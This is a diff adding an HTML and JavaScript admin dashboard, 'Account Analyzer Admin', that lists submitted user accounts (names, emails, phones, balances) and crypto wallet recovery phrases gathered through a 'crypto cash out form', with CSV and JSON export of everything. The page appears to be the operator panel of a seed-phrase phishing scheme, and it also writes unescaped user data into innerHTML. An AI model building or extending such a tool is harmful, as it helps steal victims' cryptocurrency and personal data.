@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Admin Dashboard - Account Analyzer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+        sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #1e293b, #020617);
+      color: #e5e7eb;
+      padding: 20px;
+    }
+
+    .admin-container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid rgba(148, 163, 184, 0.3);
+    }
+
+    .admin-title {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #e5e7eb;
+    }
+
+    .admin-subtitle {
+      font-size: 1rem;
+      color: #9ca3af;
+      margin-top: 4px;
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+      gap: 18px;
+      margin-bottom: 28px;
+    }
+
+    .stat-card {
+      background: rgba(15, 23, 42, 0.95);
+      border-radius: 14px;
+      padding: 20px;
+      border: 1px solid rgba(148, 163, 184, 0.25);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+    }
+
+    .stat-value {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #38bdf8;
+      margin-bottom: 8px;
+    }
+
+    .stat-label {
+      font-size: 0.9rem;
+      color: #9ca3af;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .data-section {
+      background: rgba(15, 23, 42, 0.95);
+      border-radius: 14px;
+      padding: 24px;
+      margin-bottom: 24px;
+      border: 1px solid rgba(148, 163, 184, 0.25);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+    }
+
+    .section-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      margin-bottom: 18px;
+      color: #e5e7eb;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .section-title::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: rgba(148, 163, 184, 0.3);
+    }
+
+    .search-box {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .search-input {
+      flex: 1;
+      padding: 10px 14px;
+      border-radius: 10px;
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      background: rgba(15, 23, 42, 0.85);
+      color: #e5e7eb;
+      font-size: 0.9rem;
+    }
+
+    .search-input:focus {
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 1px rgba(56, 189, 248, 0.5);
+      outline: none;
+    }
+
+    .btn {
+      padding: 10px 16px;
+      border-radius: 10px;
+      border: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: white;
+    }
+
+    .btn-secondary {
+      background: rgba(56, 189, 248, 0.2);
+      color: #38bdf8;
+      border: 1px solid rgba(56, 189, 248, 0.5);
+    }
+
+    .btn-danger {
+      background: rgba(239, 68, 68, 0.2);
+      color: #f87171;
+      border: 1px solid rgba(239, 68, 68, 0.5);
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 16px;
+    }
+
+    th {
+      text-align: left;
+      padding: 12px 16px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #9ca3af;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      border-bottom: 1px solid rgba(148, 163, 184, 0.3);
+    }
+
+    td {
+      padding: 16px;
+      border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+      font-size: 0.9rem;
+    }
+
+    tr:hover {
+      background: rgba(56, 189, 248, 0.05);
+    }
+
+    .user-name {
+      font-weight: 600;
+      color: #e5e7eb;
+    }
+
+    .user-contact {
+      color: #9ca3af;
+      font-size: 0.85rem;
+    }
+
+    .balance {
+      font-weight: 700;
+      color: #22c55e;
+    }
+
+    .phrase {
+      font-family: monospace;
+      background: rgba(15, 23, 42, 0.8);
+      padding: 8px 12px;
+      border-radius: 8px;
+      border: 1px solid rgba(148, 163, 184, 0.2);
+      font-size: 0.8rem;
+      max-width: 300px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .phrase-full {
+      white-space: normal;
+      word-break: break-all;
+    }
+
+    .wallet-badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 0.75rem;
+      font-weight: 500;
+      background: rgba(56, 189, 248, 0.2);
+      color: #38bdf8;
+    }
+
+    .actions {
+      display: flex;
+      gap: 8px;
+    }
+
+    .action-btn {
+      padding: 6px 10px;
+      border-radius: 6px;
+      border: none;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .action-btn.view {
+      background: rgba(34, 197, 94, 0.2);
+      color: #22c55e;
+    }
+
+    .action-btn.delete {
+      background: rgba(239, 68, 68, 0.2);
+      color: #f87171;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 40px 20px;
+      color: #9ca3af;
+    }
+
+    .empty-state-icon {
+      font-size: 3rem;
+      margin-bottom: 16px;
+      opacity: 0.5;
+    }
+
+    .export-options {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(15, 23, 42, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      padding: 20px;
+    }
+
+    .modal-content {
+      background: #020617;
+      border-radius: 16px;
+      padding: 24px;
+      width: 100%;
+      max-width: 600px;
+      border: 1px solid rgba(148, 163, 184, 0.5);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .modal-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #e5e7eb;
+    }
+
+    .close-btn {
+      background: none;
+      border: none;
+      color: #9ca3af;
+      font-size: 1.5rem;
+      cursor: pointer;
+      padding: 0;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .close-btn:hover {
+      color: #e5e7eb;
+    }
+
+    .detail-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .detail-item {
+      margin-bottom: 16px;
+    }
+
+    .detail-label {
+      font-size: 0.8rem;
+      color: #9ca3af;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 4px;
+    }
+
+    .detail-value {
+      font-size: 1rem;
+      color: #e5e7eb;
+      word-break: break-word;
+    }
+
+    .detail-full {
+      grid-column: 1 / -1;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    @media (max-width: 768px) {
+      .stats-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+      
+      .detail-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      th, td {
+        padding: 10px 8px;
+      }
+      
+      .actions {
+        flex-direction: column;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .search-box {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="admin-container">
+    <div class="admin-header">
+      <div>
+        <h1 class="admin-title">Account Analyzer Admin</h1>
+        <p class="admin-subtitle">Monitor all user submissions and recovery phrases</p>
+      </div>
+      <div class="export-options">
+        <button class="btn btn-secondary" id="export-csv">Export CSV</button>
+        <button class="btn btn-secondary" id="export-json">Export JSON</button>
+      </div>
+    </div>
+
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-value" id="total-users">0</div>
+        <div class="stat-label">Total Users</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="crypto-submissions">0</div>
+        <div class="stat-label">Crypto Submissions</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="total-products">0</div>
+        <div class="stat-label">Total Products</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="today-submissions">0</div>
+        <div class="stat-label">Today's Submissions</div>
+      </div>
+    </div>
+
+    <div class="data-section">
+      <div class="section-title">User Accounts</div>
+      
+      <div class="search-box">
+        <input type="text" class="search-input" id="search-input" placeholder="Search by name, email, or phone...">
+        <button class="btn btn-primary" id="search-btn">Search</button>
+        <button class="btn btn-secondary" id="clear-search">Clear</button>
+      </div>
+      
+      <div class="table-container">
+        <table id="users-table">
+          <thead>
+            <tr>
+              <th>User</th>
+              <th>Contact</th>
+              <th>Products</th>
+              <th>Balance</th>
+              <th>Session ID</th>
+              <th>Date</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="users-tbody">
+            <!-- User data will be populated here -->
+          </tbody>
+        </table>
+        
+        <div class="empty-state hidden" id="no-users">
+          <div class="empty-state-icon">📭</div>
+          <h3>No User Data</h3>
+          <p>User accounts will appear here once they submit the intake form.</p>
+        </div>
+        
+        <div class="empty-state hidden" id="no-results">
+          <div class="empty-state-icon">🔍</div>
+          <h3>No Results Found</h3>
+          <p>Try adjusting your search terms.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="data-section">
+      <div class="section-title">Crypto Recovery Phrases</div>
+      
+      <div class="table-container">
+        <table id="phrases-table">
+          <thead>
+            <tr>
+              <th>User</th>
+              <th>Wallet</th>
+              <th>Recovery Phrase</th>
+              <th>Date</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="phrases-tbody">
+            <!-- Phrase data will be populated here -->
+          </tbody>
+        </table>
+        
+        <div class="empty-state hidden" id="no-phrases">
+          <div class="empty-state-icon">🔐</div>
+          <h3>No Recovery Phrases</h3>
+          <p>Recovery phrases will appear here once users submit them through the crypto cash out form.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- User Detail Modal -->
+  <div class="modal hidden" id="user-modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">User Details</h2>
+        <button class="close-btn" id="close-user-modal">&times;</button>
+      </div>
+      <div class="detail-grid" id="user-details">
+        <!-- User details will be populated here -->
+      </div>
+    </div>
+  </div>
+
+  <!-- Phrase Detail Modal -->
+  <div class="modal hidden" id="phrase-modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Recovery Phrase</h2>
+        <button class="close-btn" id="close-phrase-modal">&times;</button>
+      </div>
+      <div class="detail-item detail-full">
+        <div class="detail-label">User</div>
+        <div class="detail-value" id="phrase-user">-</div>
+      </div>
+      <div class="detail-item">
+        <div class="detail-label">Wallet</div>
+        <div class="detail-value" id="phrase-wallet">-</div>
+      </div>
+      <div class="detail-item detail-full">
+        <div class="detail-label">Recovery Phrase</div>
+        <div class="detail-value phrase phrase-full" id="phrase-full">-</div>
+      </div>
+      <div class="detail-item">
+        <div class="detail-label">Date Submitted</div>
+        <div class="detail-value" id="phrase-date">-</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // DOM Elements
+    const usersTbody = document.getElementById('users-tbody');
+    const phrasesTbody = document.getElementById('phrases-tbody');
+    const searchInput = document.getElementById('search-input');
+    const searchBtn = document.getElementById('search-btn');
+    const clearSearch = document.getElementById('clear-search');
+    const exportCsvBtn = document.getElementById('export-csv');
+    const exportJsonBtn = document.getElementById('export-json');
+    const userModal = document.getElementById('user-modal');
+    const phraseModal = document.getElementById('phrase-modal');
+    const closeUserModal = document.getElementById('close-user-modal');
+    const closePhraseModal = document.getElementById('close-phrase-modal');
+    const userDetails = document.getElementById('user-details');
+    const phraseUser = document.getElementById('phrase-user');
+    const phraseWallet = document.getElementById('phrase-wallet');
+    const phraseFull = document.getElementById('phrase-full');
+    const phraseDate = document.getElementById('phrase-date');
+    
+    // Stats elements
+    const totalUsersEl = document.getElementById('total-users');
+    const cryptoSubmissionsEl = document.getElementById('crypto-submissions');
+    const totalProductsEl = document.getElementById('total-products');
+    const todaySubmissionsEl = document.getElementById('today-submissions');
+    
+    // Empty state elements
+    const noUsersEl = document.getElementById('no-users');
+    const noResultsEl = document.getElementById('no-results');
+    const noPhrasesEl = document.getElementById('no-phrases');
+
+    // Data storage keys
+    const ACCOUNTS_KEY = 'accounts';
+    const PHRASES_KEY = 'recoveryPhrases';
+
+    // Load data from localStorage
+    function loadAccounts() {
+      const accountsRaw = localStorage.getItem(ACCOUNTS_KEY);
+      return accountsRaw ? JSON.parse(accountsRaw) : [];
+    }
+
+    function loadPhrases() {
+      const phrasesRaw = localStorage.getItem(PHRASES_KEY);
+      return phrasesRaw ? JSON.parse(phrasesRaw) : [];
+    }
+
+    // Format date for display
+    function formatDate(dateString) {
+      const date = new Date(dateString);
+      return date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+    }
+
+    // Format currency
+    function formatCurrency(amount) {
+      return new Intl.NumberFormat('en-US', {
+        style: 'currency',
+        currency: 'USD',
+        minimumFractionDigits: 0,
+        maximumFractionDigits: 0
+      }).format(amount);
+    }
+
+    // Update statistics
+    function updateStats() {
+      const accounts = loadAccounts();
+      const phrases = loadPhrases();
+      
+      // Total users
+      totalUsersEl.textContent = accounts.length;
+      
+      // Crypto submissions
+      cryptoSubmissionsEl.textContent = phrases.length;
+      
+      // Total products
+      const totalProducts = accounts.reduce((sum, account) => sum + (account.products || 0), 0);
+      totalProductsEl.textContent = totalProducts;
+      
+      // Today's submissions
+      const today = new Date().toDateString();
+      const todaySubmissions = accounts.filter(acc => {
+        const accDate = new Date(acc.createdAt).toDateString();
+        return accDate === today;
+      }).length;
+      todaySubmissionsEl.textContent = todaySubmissions;
+    }
+
+    // Render users table
+    function renderUsersTable(filteredAccounts = null) {
+      const accounts = filteredAccounts || loadAccounts();
+      usersTbody.innerHTML = '';
+      
+      if (accounts.length === 0) {
+        noUsersEl.classList.remove('hidden');
+        noResultsEl.classList.add('hidden');
+        return;
+      }
+      
+      noUsersEl.classList.add('hidden');
+      noResultsEl.classList.add('hidden');
+      
+      accounts.forEach(account => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>
+            <div class="user-name">${account.firstName} ${account.lastName}</div>
+          </td>
+          <td>
+            <div class="user-contact">${account.email}</div>
+            <div class="user-contact">${account.phone}</div>
+          </td>
+          <td>${account.products || 0}</td>
+          <td class="balance">${formatCurrency(account.balance || 0)}</td>
+          <td>${account.sessionId || 'N/A'}</td>
+          <td>${formatDate(account.createdAt)}</td>
+          <td class="actions">
+            <button class="action-btn view" data-id="${account.id}">View</button>
+            <button class="action-btn delete" data-id="${account.id}">Delete</button>
+          </td>
+        `;
+        usersTbody.appendChild(row);
+      });
+      
+      // Add event listeners to action buttons
+      document.querySelectorAll('#users-tbody .action-btn.view').forEach(btn => {
+        btn.addEventListener('click', () => showUserDetails(btn.dataset.id));
+      });
+      
+      document.querySelectorAll('#users-tbody .action-btn.delete').forEach(btn => {
+        btn.addEventListener('click', () => deleteUser(btn.dataset.id));
+      });
+    }
+
+    // Render phrases table
+    function renderPhrasesTable() {
+      const phrases = loadPhrases();
+      phrasesTbody.innerHTML = '';
+      
+      if (phrases.length === 0) {
+        noPhrasesEl.classList.remove('hidden');
+        return;
+      }
+      
+      noPhrasesEl.classList.add('hidden');
+      
+      phrases.forEach(phrase => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>
+            <div class="user-name">${phrase.userName}</div>
+            <div class="user-contact">${phrase.userEmail}</div>
+          </td>
+          <td>
+            <span class="wallet-badge">${phrase.wallet}</span>
+          </td>
+          <td>
+            <div class="phrase">${phrase.phrase}</div>
+          </td>
+          <td>${formatDate(phrase.submittedAt)}</td>
+          <td class="actions">
+            <button class="action-btn view" data-id="${phrase.id}">View</button>
+            <button class="action-btn delete" data-id="${phrase.id}">Delete</button>
+          </td>
+        `;
+        phrasesTbody.appendChild(row);
+      });
+      
+      // Add event listeners to action buttons
+      document.querySelectorAll('#phrases-tbody .action-btn.view').forEach(btn => {
+        btn.addEventListener('click', () => showPhraseDetails(btn.dataset.id));
+      });
+      
+      document.querySelectorAll('#phrases-tbody .action-btn.delete').forEach(btn => {
+        btn.addEventListener('click', () => deletePhrase(btn.dataset.id));
+      });
+    }
+
+    // Show user details in modal
+    function showUserDetails(userId) {
+      const accounts = loadAccounts();
+      const user = accounts.find(acc => acc.id === userId);
+      
+      if (!user) return;
+      
+      userDetails.innerHTML = `
+        <div class="detail-item">
+          <div class="detail-label">First Name</div>
+          <div class="detail-value">${user.firstName || '-'}</div>
+        </div>
+        <div class="detail-item">
+          <div class="detail-label">Last Name</div>
+          <div class="detail-value">${user.lastName || '-'}</div>
+        </div>
+        <div class="detail-item">
+          <div class="detail-label">Email</div>
+          <div class="detail-value">${user.email || '-'}</div>
+        </div>
+        <div class="detail-item">
+          <div class="detail-label">Phone</div>
+          <div class="detail-value">${user.phone || '-'}</div>
+        </div>
+        <div class="detail-item">
+          <div class="detail-label">Products</div>
+          <div class="detail-value">${user.products || 0}</div>
+        </div>
+        <div class="detail-item">
+          <div class="detail-label">Balance</div>
+          <div class="detail-value balance">${formatCurrency(user.balance || 0)}</div>
+        </div>
+        <div class="detail-item detail-full">
+          <div class="detail-label">Session ID</div>
+          <div class="detail-value">${user.sessionId || '-'}</div>
+        </div>
+        <div class="detail-item">
+          <div class="detail-label">Date Created</div>
+          <div class="detail-value">${formatDate(user.createdAt)}</div>
+        </div>
+      `;
+      
+      userModal.classList.remove('hidden');
+    }
+
+    // Show phrase details in modal
+    function showPhraseDetails(phraseId) {
+      const phrases = loadPhrases();
+      const phrase = phrases.find(p => p.id === phraseId);
+      
+      if (!phrase) return;
+      
+      phraseUser.textContent = `${phrase.userName} (${phrase.userEmail})`;
+      phraseWallet.textContent = phrase.wallet;
+      phraseFull.textContent = phrase.phrase;
+      phraseDate.textContent = formatDate(phrase.submittedAt);
+      
+      phraseModal.classList.remove('hidden');
+    }
+
+    // Delete user
+    function deleteUser(userId) {
+      if (!confirm('Are you sure you want to delete this user?')) return;
+      
+      const accounts = loadAccounts();
+      const updatedAccounts = accounts.filter(acc => acc.id !== userId);
+      localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(updatedAccounts));
+      
+      renderUsersTable();
+      updateStats();
+    }
+
+    // Delete phrase
+    function deletePhrase(phraseId) {
+      if (!confirm('Are you sure you want to delete this recovery phrase?')) return;
+      
+      const phrases = loadPhrases();
+      const updatedPhrases = phrases.filter(p => p.id !== phraseId);
+      localStorage.setItem(PHRASES_KEY, JSON.stringify(updatedPhrases));
+      
+      renderPhrasesTable();
+      updateStats();
+    }
+
+    // Search users
+    function searchUsers() {
+      const query = searchInput.value.toLowerCase().trim();
+      if (!query) {
+        renderUsersTable();
+        return;
+      }
+      
+      const accounts = loadAccounts();
+      const filtered = accounts.filter(acc => 
+        (acc.firstName && acc.firstName.toLowerCase().includes(query)) ||
+        (acc.lastName && acc.lastName.toLowerCase().includes(query)) ||
+        (acc.email && acc.email.toLowerCase().includes(query)) ||
+        (acc.phone && acc.phone.includes(query)) ||
+        (acc.sessionId && acc.sessionId.toLowerCase().includes(query))
+      );
+      
+      if (filtered.length === 0) {
+        usersTbody.innerHTML = '';
+        noUsersEl.classList.add('hidden');
+        noResultsEl.classList.remove('hidden');
+      } else {
+        renderUsersTable(filtered);
+      }
+    }
+
+    // Export data as CSV
+    function exportToCsv() {
+      const accounts = loadAccounts();
+      const phrases = loadPhrases();
+      
+      let csvContent = "data:text/csv;charset=utf-8,";
+      
+      // Add accounts
+      csvContent += "ACCOUNTS\n";
+      csvContent += "First Name,Last Name,Email,Phone,Products,Balance,Session ID,Date Created\n";
+      accounts.forEach(acc => {
+        csvContent += `"${acc.firstName || ''}","${acc.lastName || ''}","${acc.email || ''}","${acc.phone || ''}",${acc.products || 0},${acc.balance || 0},"${acc.sessionId || ''}","${acc.createdAt}"\n`;
+      });
+      
+      // Add phrases
+      csvContent += "\nRECOVERY PHRASES\n";
+      csvContent += "User Name,User Email,Wallet,Recovery Phrase,Date Submitted\n";
+      phrases.forEach(phrase => {
+        csvContent += `"${phrase.userName || ''}","${phrase.userEmail || ''}","${phrase.wallet || ''}","${phrase.phrase || ''}","${phrase.submittedAt}"\n`;
+      });
+      
+      const encodedUri = encodeURI(csvContent);
+      const link = document.createElement("a");
+      link.setAttribute("href", encodedUri);
+      link.setAttribute("download", "account_analyzer_data.csv");
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // Export data as JSON
+    function exportToJson() {
+      const accounts = loadAccounts();
+      const phrases = loadPhrases();
+      
+      const data = {
+        exportedAt: new Date().toISOString(),
+        accounts: accounts,
+        recoveryPhrases: phrases
+      };
+      
+      const dataStr = JSON.stringify(data, null, 2);
+      const dataBlob = new Blob([dataStr], {type: 'application/json'});
+      
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(dataBlob);
+      link.download = "account_analyzer_data.json";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // Initialize the admin dashboard
+    function initAdmin() {
+      // Render initial data
+      renderUsersTable();
+      renderPhrasesTable();
+      updateStats();
+      
+      // Add event listeners
+      searchBtn.addEventListener('click', searchUsers);
+      clearSearch.addEventListener('click', () => {
+        searchInput.value = '';
+        renderUsersTable();
+      });
+      searchInput.addEventListener('keyup', (e) => {
+        if (e.key === 'Enter') searchUsers();
+      });
+      
+      exportCsvBtn.addEventListener('click', exportToCsv);
+      exportJsonBtn.addEventListener('click', exportToJson);
+      
+      closeUserModal.addEventListener('click', () => userModal.classList.add('hidden'));
+      closePhraseModal.addEventListener('click', () => phraseModal.classList.add('hidden'));
+      
+      // Close modals when clicking outside
+      userModal.addEventListener('click', (e) => {
+        if (e.target === userModal) userModal.classList.add('hidden');
+      });
+      
+      phraseModal.addEventListener('click', (e) => {
+        if (e.target === phraseModal) phraseModal.classList.add('hidden');
+      });
+      
+      // Auto-refresh data every 5 seconds
+      setInterval(() => {
+        renderUsersTable();
+        renderPhrasesTable();
+        updateStats();
+      }, 5000);
+    }
+
+    // Initialize when page loads
+    document.addEventListener('DOMContentLoaded', initAdmin);
+  </script>
+</body>
+</html>
